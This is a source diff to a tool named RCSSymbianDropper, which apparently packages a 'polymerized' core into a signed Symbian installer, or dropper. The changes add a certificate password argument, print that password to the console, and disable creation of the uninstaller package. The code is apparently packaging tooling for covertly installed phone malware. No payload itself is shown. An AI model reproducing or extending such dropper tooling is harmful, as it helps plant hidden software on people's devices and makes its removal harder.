@@ -8,17 +8,19 @@ int _tmain(int argc, _TCHAR* argv[])
 	HANDLE hFile;
 	WCHAR wsCERFile[MAX_PATH];
 	WCHAR wsKEYFile[MAX_PATH];
+	WCHAR wsPass[MAX_PATH];
 	WCHAR wsCoreFile[MAX_PATH];
 	WCHAR wsUnFile[MAX_PATH];
 	WCHAR wsOutFile[MAX_PATH];
 	unsigned int iLen = 0;
 
-	if (argc != 6) {
+	if (argc != 7) {
 		printf("ERROR: \n");
-		printf("  usage:  RCSSymbianDropper.exe <core> <cer> <key> <uninstaller> <output>\n\n");
+		printf("  usage:  RCSSymbianDropper.exe <core> <cer> <key> <pass> <uninstaller> <output>\n\n");
 		printf("  <core> is the core already polymerized\n");
 		printf("  <cer> is the certificate to sign the sysx\n");
 		printf("  <key> is the private key of the certificate\n");
+		printf("  <pass> is the password of the certificates\n");
 		printf("  <uninstaller> is the core uninstaller\n");
 		printf("  <output> is the output file (without extension)\n\n");
 		return 0;
@@ -27,8 +29,9 @@ int _tmain(int argc, _TCHAR* argv[])
 	wsprintf(wsCoreFile, L"%s", argv[1]);
 	wsprintf(wsCERFile, L"%s", argv[2]);
 	wsprintf(wsKEYFile, L"%s", argv[3]);
-	wsprintf(wsUnFile, L"%s", argv[4]);
-	wsprintf(wsOutFile, L"%s", argv[5]);
+	wsprintf(wsPass, L"%s", argv[4]);
+	wsprintf(wsUnFile, L"%s", argv[5]);
+	wsprintf(wsOutFile, L"%s", argv[6]);
 
 	/************************************************************************/
 	/*  SANITY CHECKS                                                       */
@@ -56,6 +59,7 @@ int _tmain(int argc, _TCHAR* argv[])
 	printf("INPUT CORE    [%S]\n", wsCoreFile);
 	printf("CERFILE       [%S]\n", wsCERFile);
 	printf("KEYFILE       [%S]\n", wsKEYFile);
+	printf("PASSWORD      [%S]\n", wsPass);
 	printf("UNINSTALLER   [%S]\n", wsUnFile);
 	printf("OUTPUT FILE   [%S]\n\n", wsOutFile);
 
@@ -63,7 +67,7 @@ int _tmain(int argc, _TCHAR* argv[])
 	/************************************************************************/
 	/* UNINSTALLER SIS CREATION                                             */
 	/************************************************************************/
-
+#if 0
 	if (CreateSis(SIS_UNINST, wsUnFile))
 		printf("Creating uninstaller sis file... ok\n");
 	else {
@@ -76,14 +80,14 @@ int _tmain(int argc, _TCHAR* argv[])
 	/************************************************************************/
 
 
-	if (SignSis(wsUnFile, wsCERFile, wsKEYFile))
+	if (SignSis(wsUnFile, wsCERFile, wsKEYFile, wsPass))
 		printf("Using the certificate to sign the uninstaller... ok\n");
 	else {
 		printf("Cannot sign with the certificate file [%S][%S]\n", wsCERFile, wsKEYFile);
 		DeleteFile(wsOutFile);
 		return ERROR_EMBEDDING;
 	}
-
+#endif
 	/************************************************************************/
 	/* FINAL SIS CREATION                                                   */
 	/************************************************************************/
@@ -100,7 +104,7 @@ int _tmain(int argc, _TCHAR* argv[])
 	/* SIGNING                                                              */
 	/************************************************************************/
 
-	if (SignSis(wsOutFile, wsCERFile, wsKEYFile))
+	if (SignSis(wsOutFile, wsCERFile, wsKEYFile, wsPass))
 		printf("Using the certificate to sign the code... ok\n");
 	else {
 		printf("Cannot sign with the certificate file [%S][%S]\n", wsCERFile, wsKEYFile);
